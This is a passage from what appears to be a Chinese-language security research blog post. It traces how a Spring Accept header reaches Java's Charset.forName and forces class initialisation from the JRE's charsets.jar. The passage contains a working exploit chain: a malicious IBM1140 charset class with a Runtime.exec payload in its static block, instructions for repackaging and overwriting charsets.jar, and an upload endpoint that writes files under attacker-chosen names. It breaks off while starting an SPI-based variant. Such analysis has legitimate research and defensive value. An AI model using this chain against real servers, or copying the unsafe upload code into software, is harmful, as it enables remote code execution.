parameters.forEach((parameter, value) -&gt; &#123;<br>            <span class="hljs-comment">//调用至MimeType#checkParameters()</span><br>            <span class="hljs-built_in">this</span>.checkParameters(parameter, value);<br>            map.put(parameter, value);<br>        &#125;);<br>        <span class="hljs-built_in">this</span>.parameters = Collections.unmodifiableMap(map);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">this</span>.parameters = Collections.emptyMap();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/image/image-18.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>org.springframework.util.MimeType#checkParameters(parameter, value)</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkParameters</span><span class="hljs-params">(String parameter, String value)</span> &#123;<br>    Assert.hasLength(parameter, <span class="hljs-string">&quot;&#x27;parameter&#x27; must not be empty&quot;</span>);<br>    Assert.hasLength(value, <span class="hljs-string">&quot;&#x27;value&#x27; must not be empty&quot;</span>);<br>    <span class="hljs-built_in">this</span>.checkToken(parameter);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;charset&quot;</span>.equals(parameter)) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.resolvedCharset == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-comment">//调用至Charset.forName()</span><br>            <span class="hljs-built_in">this</span>.resolvedCharset = Charset.forName(<span class="hljs-built_in">this</span>.unquote(value));<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.isQuotedString(value)) &#123;<br>        <span class="hljs-built_in">this</span>.checkToken(value);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/image/image-19.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>java.nio.charset.Charset#forName(String charsetName)charsetName)跟进forName()方法,最后调用至Charset#lookup2()</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Charset <span class="hljs-title function_">forName</span><span class="hljs-params">(String charsetName)</span> &#123;<br>    <span class="hljs-type">Charset</span> <span class="hljs-variable">cs</span> <span class="hljs-operator">=</span> lookup(charsetName);<br>    <span class="hljs-keyword">if</span> (cs != <span class="hljs-literal">null</span>)<br>        <span class="hljs-keyword">return</span> cs;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnsupportedCharsetException</span>(charsetName);<br>&#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Charset <span class="hljs-title function_">lookup</span><span class="hljs-params">(String charsetName)</span> &#123;<br>    <span class="hljs-keyword">if</span> (charsetName == <span class="hljs-literal">null</span>)<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Null charset name&quot;</span>);<br>    Object[] a;<br>    <span class="hljs-keyword">if</span> ((a = cache1) != <span class="hljs-literal">null</span> &amp;&amp; charsetName.equals(a[<span class="hljs-number">0</span>]))<br>        <span class="hljs-keyword">return</span> (Charset)a[<span class="hljs-number">1</span>];<br>    <span class="hljs-comment">// We expect most programs to use one Charset repeatedly.</span><br>    <span class="hljs-comment">// We convey a hint to this effect to the VM by putting the</span><br>    <span class="hljs-comment">// level 1 cache miss code in a separate method.</span><br>    <span class="hljs-keyword">return</span> lookup2(charsetName);<br>&#125;<br><span class="hljs-comment">//调用至lookuo2</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Charset <span class="hljs-title function_">lookup2</span><span class="hljs-params">(String charsetName)</span> &#123;<br>    Object[] a;<br>    <span class="hljs-keyword">if</span> ((a = cache2) != <span class="hljs-literal">null</span> &amp;&amp; charsetName.equals(a[<span class="hljs-number">0</span>])) &#123;<br>        cache2 = cache1;<br>        cache1 = a;<br>        <span class="hljs-keyword">return</span> (Charset)a[<span class="hljs-number">1</span>];<br>    &#125;<br>    Charset cs;<br>    <span class="hljs-keyword">if</span> ((cs = standardProvider.charsetForName(charsetName)) != <span class="hljs-literal">null</span> ||<br>        (cs = lookupExtendedCharset(charsetName))           != <span class="hljs-literal">null</span> ||<br>        (cs = lookupViaProviders(charsetName))              != <span class="hljs-literal">null</span>)<br>    &#123;<br>        cache(charsetName, cs);<br>        <span class="hljs-keyword">return</span> cs;<br>    &#125;<br><br>    <span class="hljs-comment">/* Only need to check the name if we didn&#x27;t find a charset for it */</span><br>    checkName(charsetName);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>存在三种方式</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">cs = standardProvider.charsetForName(charsetName))<br>cs = lookupExtendedCharset(charsetName))<br>cs = lookupViaProviders(charsetName))  <br></code></pre></td></tr></table></figure>

<p>standardProvider.charsetForName最终调用至sun.nio.cs.AbstractCharsetProvider#lookup()造成可控的类初始化</p>
<p>sun.nio.cs.AbstractCharsetProvider#lookup()</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> Charset <span class="hljs-title function_">lookup</span><span class="hljs-params">(String var1)</span> &#123;<br>    <span class="hljs-type">SoftReference</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> (SoftReference)<span class="hljs-built_in">this</span>.cache.get(var1);<br>    <span class="hljs-keyword">if</span> (var2 != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-type">Charset</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> (Charset)var2.get();<br>        <span class="hljs-keyword">if</span> (var3 != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> var3;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-type">String</span> <span class="hljs-variable">var9</span> <span class="hljs-operator">=</span> (String)<span class="hljs-built_in">this</span>.classMap.get(var1);<br>    <span class="hljs-keyword">if</span> (var9 == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//this.packagePrefix = &quot;sun.nio.cs&quot;;</span><br>            <span class="hljs-comment">//var9Charset.forName(String charsetName)中charsetName值</span><br>            <span class="hljs-comment">//此处可进行自定义类的初始化</span><br>            <span class="hljs-type">Class</span> <span class="hljs-variable">var4</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-built_in">this</span>.packagePrefix + <span class="hljs-string">&quot;.&quot;</span> + var9, <span class="hljs-literal">true</span>, <span class="hljs-built_in">this</span>.getClass().getClassLoader());<br>            <span class="hljs-type">Charset</span> <span class="hljs-variable">var5</span> <span class="hljs-operator">=</span> (Charset)var4.newInstance();<br>            <span class="hljs-built_in">this</span>.cache.put(var1, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoftReference</span>(var5));<br>            <span class="hljs-keyword">return</span> var5;<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var6) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException var7) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125; <span class="hljs-keyword">catch</span> (InstantiationException var8) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/image/image-20.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>java.nio.charset.Charset#lookupExtendedCharset(charsetName)</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Charset <span class="hljs-title function_">lookupExtendedCharset</span><span class="hljs-params">(String charsetName)</span> &#123;<br>    <span class="hljs-type">CharsetProvider</span> <span class="hljs-variable">ecp</span> <span class="hljs-operator">=</span> ExtendedProviderHolder.extendedProvider;<br>    <span class="hljs-keyword">return</span> (ecp != <span class="hljs-literal">null</span>) ? ecp.charsetForName(charsetName) : <span class="hljs-literal">null</span>;<br>&#125;<br><br><span class="hljs-comment">/* The extended set of charsets */</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ExtendedProviderHolder</span> &#123;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">CharsetProvider</span> <span class="hljs-variable">extendedProvider</span> <span class="hljs-operator">=</span> extendedProvider();<br>    <span class="hljs-comment">// returns ExtendedProvider, if installed</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> CharsetProvider <span class="hljs-title function_">extendedProvider</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> AccessController.doPrivileged(<br>                   <span class="hljs-keyword">new</span> <span class="hljs-title class_">PrivilegedAction</span>&lt;CharsetProvider&gt;() &#123;<br>                       <span class="hljs-keyword">public</span> CharsetProvider <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>                            <span class="hljs-keyword">try</span> &#123;<br>                                Class&lt;?&gt; epc<br>                                    = Class.forName(<span class="hljs-string">&quot;sun.nio.cs.ext.ExtendedCharsets&quot;</span>);<br>                                <span class="hljs-keyword">return</span> (CharsetProvider)epc.newInstance();<br>                            &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException x) &#123;<br>                                <span class="hljs-comment">// Extended charsets not available</span><br>                                <span class="hljs-comment">// (charsets.jar not present)</span><br>                            &#125; <span class="hljs-keyword">catch</span> (InstantiationException |<br>                                     IllegalAccessException x) &#123;<br>                              <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(x);<br>                            &#125;<br>                            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>                        &#125;<br>                    &#125;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>此链直接加载sun.nio.cs.ext.ExtendedCharsets。可用恶意类直接替换此类，造成代码执行。</p>
<p>堆栈如下：</p>
<p> lookup:146, AbstractCharsetProvider (sun.nio.cs) charsetForName:161, </p>
<p>AbstractCharsetProvider (sun.nio.cs) lookupExtendedCharset:452, </p>
<p>Charset (java.nio.charset) lookup2:476, Charset (java.nio.charset) lookup:464, </p>
<p>Charset (java.nio.charset) forName:528, Charset (java.nio.charset) checkParameters:235, </p>
<p>MimeType (org.springframework.util) lambda$new$0:190, MimeType (org.springframework.util) accept:-1, </p>
<p>1727436976 (org.springframework.util.MimeType$$Lambda$156) forEach:684,</p>
<p> LinkedHashMap (java.util) <init>:189, MimeType (org.springframework.util) parseMimeTypeInternal:269, </p>
<p>MimeTypeUtils (org.springframework.util) parseMimeType:207,</p>
<p> MimeTypeUtils (org.springframework.util) parseMediaType:631, </p>
<p>MediaType (org.springframework.http) parseMediaTypes:660, </p>
<p>MediaType (org.springframework.http) parseMediaTypes:680, </p>
<p>MediaType (org.springframework.http) resolveMediaTypes:53, </p>
<p>HeaderContentNegotiationStrategy (org.springframework.web.accept) resolveMediaTypes:128, ContentNegotiationManager (org.springframework.web.accept) getMediaTypes:260, ContentNegotiatingViewResolver (org.springframework.web.servlet.view) resolveViewName:226, ContentNegotiatingViewResolver (org.springframework.web.servlet.view) resolveViewName:1446, DispatcherServlet (org.springframework.web.servlet) render:1381,</p>
<p> ………….</p>
<h3 id="写入恶意jar文件getshell"><a href="#写入恶意jar文件getshell" class="headerlink" title="写入恶意jar文件getshell"></a>写入恶意jar文件getshell</h3><p>根据上文分析，可通过上传恶意charsets.jar文件覆盖原有charsets.jar文件，再通过HTTP请求header头中Accept通过Spring来初始化恶意charsets.jar中的目标类。</p>
<p>charsets.jar中存在大量编码方式的类，挑选不常见编码方式的static静态代码块进行替换，执行恶意代码。（一个类只会加载、初始化一次）</p>
<h4 id="构造恶意类："><a href="#构造恶意类：" class="headerlink" title="构造恶意类："></a>构造恶意类：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> sun.nio.cs.ext;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.nio.charset.Charset;<br><span class="hljs-keyword">import</span> java.nio.charset.CharsetDecoder;<br><span class="hljs-keyword">import</span> java.nio.charset.CharsetEncoder;<br><span class="hljs-keyword">import</span> sun.nio.cs.HistoricallyNamedCharset;<br><span class="hljs-keyword">import</span> sun.nio.cs.SingleByte;<br><span class="hljs-keyword">import</span> sun.nio.cs.SingleByte.Decoder;<br><span class="hljs-keyword">import</span> sun.nio.cs.SingleByte.Encoder;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IBM1140</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Charset</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HistoricallyNamedCharset</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">b2cTable</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Øabcdefghi«»ðýþ±°jklmnopqrªºæ¸Æ€µ~stuvwxyz¡¿ÐÝÞ®^£¥·©§¶¼½¾[]¯¨´×&#123;ABCDEFGHI\u00adôöòóõ&#125;JKLMNOPQR¹ûüùúÿ\\÷STUVWXYZ²ÔÖÒÓÕ0123456789³ÛÜÙÚ\u009f\u0000\u0001\u0002\u0003\u009c\t\u0086\u007f\u0097\u008d\u008e\u000b\f\r\u000e\u000f\u0010\u0011\u0012\u0013\u009d\n\b\u0087\u0018\u0019\u0092\u008f\u001c\u001d\u001e\u001f\u0080\u0081\u0082\u0083\u0084\n\u0017\u001b\u0088\u0089\u008a\u008b\u008c\u0005\u0006\u0007\u0090\u0091\u0016\u0093\u0094\u0095\u0096\u0004\u0098\u0099\u009a\u009b\u0014\u0015\u009e\u001a  âäàáãåçñ¢.&lt;(+|&amp;éêëèíîïìß!$*);¬-/ÂÄÀÁÃÅÇÑ¦,%_&gt;?øÉÊËÈÍÎÏÌ`:#@&#x27;=\&quot;&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">char</span>[] b2c = <span class="hljs-string">&quot;Øabcdefghi«»ðýþ±°jklmnopqrªºæ¸Æ€µ~stuvwxyz¡¿ÐÝÞ®^£¥·©§¶¼½¾[]¯¨´×&#123;ABCDEFGHI\u00adôöòóõ&#125;JKLMNOPQR¹ûüùúÿ\\÷STUVWXYZ²ÔÖÒÓÕ0123456789³ÛÜÙÚ\u009f\u0000\u0001\u0002\u0003\u009c\t\u0086\u007f\u0097\u008d\u008e\u000b\f\r\u000e\u000f\u0010\u0011\u0012\u0013\u009d\n\b\u0087\u0018\u0019\u0092\u008f\u001c\u001d\u001e\u001f\u0080\u0081\u0082\u0083\u0084\n\u0017\u001b\u0088\u0089\u008a\u008b\u008c\u0005\u0006\u0007\u0090\u0091\u0016\u0093\u0094\u0095\u0096\u0004\u0098\u0099\u009a\u009b\u0014\u0015\u009e\u001a  âäàáãåçñ¢.&lt;(+|&amp;éêëèíîïìß!$*);¬-/ÂÄÀÁÃÅÇÑ¦,%_&gt;?øÉÊËÈÍÎÏÌ`:#@&#x27;=\&quot;&quot;</span>.toCharArray();<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">char</span>[] c2b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">char</span>[<span class="hljs-number">512</span>];<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">char</span>[] c2bIndex = <span class="hljs-keyword">new</span> <span class="hljs-title class_">char</span>[<span class="hljs-number">256</span>];<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">exploit</span><span class="hljs-params">(String cmd)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Process</span> <span class="hljs-variable">var1</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException var2) &#123;<br>            var2.printStackTrace();<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">IBM1140</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>(<span class="hljs-string">&quot;IBM01140&quot;</span>, ExtendedCharsets.aliasesFor(<span class="hljs-string">&quot;IBM01140&quot;</span>));<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">historicalName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Cp1140&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">contains</span><span class="hljs-params">(Charset var1)</span> &#123;<br>        <span class="hljs-keyword">return</span> var1 <span class="hljs-keyword">instanceof</span> IBM1140;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> CharsetDecoder <span class="hljs-title function_">newDecoder</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Decoder</span>(<span class="hljs-built_in">this</span>, b2c);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> CharsetEncoder <span class="hljs-title function_">newEncoder</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Encoder</span>(<span class="hljs-built_in">this</span>, c2b, c2bIndex);<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        exploit(<span class="hljs-string">&quot;&quot;</span>);<br>        <span class="hljs-type">char</span>[] var0 = b2c;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">var1</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">char</span>[] var2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">char</span>[]&#123;<span class="hljs-string">&#x27;\u0015&#x27;</span>, <span class="hljs-string">&#x27;\u0085&#x27;</span>&#125;;<br>        SingleByte.initC2B(var0, var2, c2b, c2bIndex);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>编译恶意类并覆盖charsets.jar中原有文件，重新打包</p>
<p><img src="/image/image-21.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>打包后用恶意charsets.jar覆盖jre中charsets.jar，构造请求：</p>
<p><img src="/image/image-22.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>此为直接覆盖，接下来写个上传demo,实现任意文件上传(写入)Spring boot下的getshell</p>
<p>spring boot默认文件上传为1MB,需添加如下配置：</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">mvc:</span><br>  <span class="hljs-attr">servlet:</span><br>    <span class="hljs-attr">multipart:</span><br>      <span class="hljs-attr">max-file-size:</span> <span class="hljs-string">10MB</span>  		<span class="hljs-comment"># 设置单个文件最大大小为10MB</span><br>      <span class="hljs-attr">max-request-size:</span> <span class="hljs-string">100MB</span>  	<span class="hljs-comment"># 设置多个文件大小为100MB</span><br></code></pre></td></tr></table></figure>

<h4 id="文件上传demo"><a href="#文件上传demo" class="headerlink" title="文件上传demo"></a>文件上传demo</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//文件上传demo</span><br><span class="hljs-meta">@PostMapping(&quot;upload5&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">upload5</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> MultipartFile file)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br><br>    <span class="hljs-keyword">if</span> (file != <span class="hljs-literal">null</span>)&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;C:\\file\\&quot;</span>;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">originalFilename</span> <span class="hljs-operator">=</span> file.getOriginalFilename();<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">filepath</span> <span class="hljs-operator">=</span> path + originalFilename;<br><br>        <span class="hljs-type">File</span> <span class="hljs-variable">saveFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(filepath);<br><br>        file.transferTo(saveFile);<br><br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;文件上传成功！！！文件地址为&quot;</span> + filepath;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;上传失败，上传文件为空&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>抓包上传报错，无法覆盖文件<img src="/image/image-23.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p><img src="/image/image-24.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>linux下可成功上传</p>
<p><img src="/image/image-25.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>发包</p>
<p><img src="/image/image-26.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>执行恶意代码，因之前恶意代码为windows下执行，故此处报错。但恶意代码已经执行</p>
<p><img src="/image/image-27.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><p>1、可控制文件路径及文件名</p>
<p>2、知道jre目录并写入jre目录</p>
<p>3、windows下存在文件不能覆盖问题，Linux下正常</p>
<p>4、jar包将近3MB,包较大</p>
<h3 id="通过SPI机制getshell"><a href="#通过SPI机制getshell" class="headerlink" title="通过SPI机制getshell"></a>通过SPI机制getshell</h3><p>SPI机制于Snakeyaml中以进行解释，此处不再赘述。</p>
<h4 id="java-nio-charset-Charset-forName-String-charsetName"><a href="#java-nio-charset-Charset-forName-String-charsetName" class="headerlink" title="java.nio.charset.Charset#forName(String charsetName)"></a>java.nio.charset.Charset#forName(String charsetName)</h4><p>上述分析到Spring 可使用HTTP请求header头中Accept参数最后调用至java.nio.charset.Charset#forName(String charsetName)，其中charsetName可控，跟进forName()方法,最后调用至Charset#lookup2()</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Charset <span class="hljs-title function_">forName</span><span class="hljs-params">(String charsetName)</span> &#123;<br>    <span class="hljs-type">Charset</span> <span class="hljs-variable">cs</span> <span class="hljs-operator">=</span> lookup(charsetName);<br>    <span class="hljs-keyword">if</span> (cs != <span class="hljs-literal">null</span>)<br>        <span class="hljs-keyword">return</span> cs;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnsupportedCharsetException</span>(charsetName);<br>&#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Charset <span class="hljs-title function_">lookup</span><span class="hljs-params">(String charsetName)</span> &#123;<br>    <span class="hljs-keyword">if</span> (charsetName == <span class="hljs-literal">null</span>)<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Null charset name&quot;</span>);<br>    Object[] a;<br>    <span class="hljs-keyword">if</span> ((a = cache1) != <span class="hljs-literal">null</span> &amp;&amp; charsetName.equals(a[<span class="hljs-number">0</span>]))<br>        <span class="hljs-keyword">return</span> (Charset)a[<span class="hljs-number">1</span>];<br>    <span class="hljs-comment">// We expect most programs to use one Charset repeatedly.</span><br>    <span class="hljs-comment">// We convey a hint 